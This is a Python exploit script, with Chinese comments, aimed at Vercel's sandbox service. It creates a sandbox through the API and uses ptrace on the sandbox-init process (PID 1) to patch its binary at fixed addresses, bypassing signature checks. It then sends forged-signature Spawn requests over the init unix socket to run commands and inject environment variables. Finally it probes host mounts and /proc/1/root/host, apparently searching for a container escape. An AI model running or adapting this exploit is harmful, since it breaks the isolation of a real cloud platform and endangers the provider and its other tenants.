# 实验J66: 免签名 Spawn 成功后的深度侦察
# [1] sandbox-init (/proc/1) 权限: uid/gid/caps/ns
# [2] spawn 出的进程能否看到宿主挂载 (mountinfo 对比)
# [3] SpawnRequest 完整字段 (command/arguments/environment/working_directory)
# [4] environment 注入测试
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj66"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()

print("===== [1] patch 失败分支 =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
for va in [0x83b571, 0x83b5af]:
    ok, total = ptrace_rw(va, data=PATCH_A)
    print("PATCH A @ %s: %d/%d" % (hex(va), ok, total), flush=True)
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
ok, total = ptrace_rw(0x82a9f9, data=PATCH_B)
print("PATCH B: %d/%d" % (ok, total), flush=True)

def spawn_call(payload, ctype="application/connect+json", timeout=15):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost/vercel.sandbox.spawn.v1.SpawnService/Spawn"]
    try:
        r = subprocess.run(cmd, input=payload, capture_output=True, timeout=timeout+2)
        return r.stdout
    except Exception as e:
        return None

def spawn_json(req_obj, timeout=15):
    body = json.dumps(req_obj).encode()
    env_body = b"\x00" + struct.pack(">I", len(body)) + body
    out = spawn_call(env_body, timeout=timeout)
    if out is None:
        return "EXC"
    idx = out.find(b"\r\n\r\n")
    data = out[idx+4:] if idx >= 0 else out
    events = []
    i = 0
    while i + 5 <= len(data):
        flag = data[i]
        ln = struct.unpack(">I", data[i+1:i+5])[0]
        if i + 5 + ln > len(data):
            break
        payload = data[i+5:i+5+ln]
        try:
            events.append((flag, json.loads(payload)))
        except Exception:
            events.append((flag, payload))
        i += 5 + ln
    return events

def b64d(d):
    try:
        return base64.b64decode(d).decode("utf-8", "replace")
    except Exception:
        return d

print("===== [2] sandbox-init 权限 =====", flush=True)
for p in ["/proc/1/status", "/proc/1/cmdline"]:
    try:
        print("--- %s ---" % p, flush=True)
        print(open(p).read()[:1200], flush=True)
    except Exception as e:
        print("ERR %s: %s" % (p, e), flush=True)
# capabilities
try:
    for f in ["/proc/1/status"]:
        pass
except Exception:
    pass

print("===== [3] mount 视图对比 (self vs pid1) =====", flush=True)
def mounts(pid):
    try:
        return open("/proc/%d/mountinfo" % pid).read()
    except Exception as e:
        return "ERR %s" % e
m1 = mounts(1)
ms = mounts(os.getpid())
print("pid1 mountinfo lines:", len(m1.splitlines()), "| self:", len(ms.splitlines()), flush=True)
# 找差异: 只存在于 pid1 的挂载 (宿主磁盘?)
p1 = set(m1.splitlines())
ps = set(ms.splitlines())
only1 = [x for x in p1 if x not in ps]
print("--- mounts only visible to pid1 (%d) ---" % len(only1), flush=True)
for x in only1[:30]:
    print("  %s" % x, flush=True)

print("===== [4] Spawn 完整字段测试 =====", flush=True)
ev = spawn_json({"command": "sh", "arguments": ["-c",
    "echo WHO=\\$USER; echo PWD=\\$PWD; id; ls /host 2>&1 | head -5; "
    "cat /proc/self/status | grep -E 'Uid|Gid|Cap'"], "environment": ["FOO=bar123", "PATH=/usr/bin:/bin"]})
for flag, e in ev:
    if isinstance(e, dict) and "stdout" in e:
        print("OUT: %s" % b64d(e["stdout"]), flush=True)
    elif isinstance(e, dict) and "stderr" in e:
        print("ERR: %s" % b64d(e["stderr"]), flush=True)
    else:
        print("EV: %r" % (e,), flush=True)

print("===== [5] /proc/1/root 与 /host 检查 =====", flush=True)
ev = spawn_json({"command": "ls", "arguments": ["-la", "/proc/1/root/host"]})
for flag, e in ev:
    if isinstance(e, dict) and "stdout" in e:
        print("OUT: %s" % b64d(e["stdout"]), flush=True)
    elif isinstance(e, dict) and "stderr" in e:
        print("ERR: %s" % b64d(e["stderr"]), flush=True)
    else:
        print("EV: %r" % (e,), flush=True)
'''
run_cmd(sid, SCAN, "post-bypass-recon", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
